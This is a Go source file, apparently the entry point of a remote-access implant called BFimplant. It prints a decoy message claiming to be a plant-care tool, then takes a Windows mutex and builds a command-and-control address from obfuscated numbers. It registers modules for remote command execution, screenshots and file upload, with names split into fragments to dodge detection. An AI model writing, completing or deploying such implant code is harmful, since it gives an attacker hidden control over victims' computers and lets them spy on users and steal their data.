package main

import (
	"BFimplant/modules"
	"BFimplant/mymutex"
	"fmt"
	"strconv"
	"syscall"
)


func main() {
	fmt.Println("this a plant detection water and soil and food for better plants in the world <3")
	mutexName := "Global\\BFimplantMutex"

	// Create a new mutex
	mutex, err := mymutex.CreateMutex(mutexName)
	if err != nil {
		fmt.Println("Error creating mutex:", err)
		return
	}
	defer syscall.CloseHandle(mutex) // Ensure the handle is closed when done

	waitResult, _ := mymutex.WaitForSingleObject(mutex,0)
	
	if waitResult == syscall.WAIT_OBJECT_0 {


		str1:=""
		str2:=""
		str3:=""
		str4:=""
		strp:=""
		x:=len(str1)+192
		y:=len(str2)+168
		z:=len(str3)+1
		k:=len(str4)+247
		l:=len(strp)+5000

		c2ServerURL := "http://" + strconv.Itoa(x) + "." + strconv.Itoa(y) + "." + strconv.Itoa(z) + "." + strconv.Itoa(k) + ":" + strconv.Itoa(l)

		defer mymutex.ReleaseMutex(mutex)
		implant := NewImplant(c2ServerURL)
		

		// Register modules
		implant.Modules["c"+"m"+"d"] = modules.NewExecuteModule()
		implant.Modules["ping"] = modules.NewPingModule()
		implant.Modules["scr"+"eens"+"hot"] = modules.NewScreenshotModule()
		implant.Modules["up"+"lo"+"ad"] = modules.NewUploadModule()

		implant.Start()

		
	}
	
}
